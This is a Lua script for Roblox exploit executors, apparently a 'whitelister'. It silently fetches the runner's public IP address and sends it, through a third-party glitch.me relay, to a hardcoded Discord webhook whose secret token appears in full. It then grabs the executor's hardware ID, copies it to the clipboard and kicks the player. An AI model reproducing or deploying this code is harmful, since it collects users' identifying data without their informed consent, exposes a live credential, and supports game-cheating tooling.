local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
local function SendMessage(Webhook, Message, Botname)
   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
       return error("Send a valid URL");
   end
   local Name;
   local API = "http://buritoman69.glitch.me/webhook";
   if (not Message or Message == "" or not Botname) then
       Name = "GameBot"
       return error("nil or empty message!")
   else
       Name = Botname;
   end
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:HttpPost(API, Body, false, "application/json")
   return Data or nil;
end
SendMessage("https://discordapp.com/api/webhooks/726451442344525856/9Q3g6_0GZCeN-cEg5wITH6_Y7hDfOg6vSl55BUlXQFqIJnWu4gfBLNjQ0QiQ4OOmaO2N"," Whitelister Executed , IP: "..ip.." was logged. Please add this to #whitelisted ", "Whitelister")

local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
	setclipboard(hwid)
	game:GetService("Players").LocalPlayer:Kick('copied hwid to clipboard')
else
	game:GetService("Players").LocalPlayer:Kick('unable to find hwid')
end
